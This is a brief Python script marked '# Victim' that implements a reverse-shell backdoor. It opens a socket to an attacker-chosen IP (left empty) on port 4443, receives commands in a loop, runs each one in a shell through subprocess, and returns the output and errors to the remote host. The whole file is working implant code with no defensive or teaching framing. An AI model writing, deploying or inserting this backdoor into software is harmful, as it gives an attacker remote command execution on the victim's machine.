# Victim
import socket
import subprocess

connectbackip = ''
connectbackport = 4443

backdoor = socket.socket()
backdoor.connect((connectbackip, connectbackport))

while True:
    cmd = backdoor.recv(1024)
    cmd = cmd.decode()
    ops = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    output = ops.stdout.read()
    output_errors = ops.stderr.read()
    backdoor.send(output + output_errors)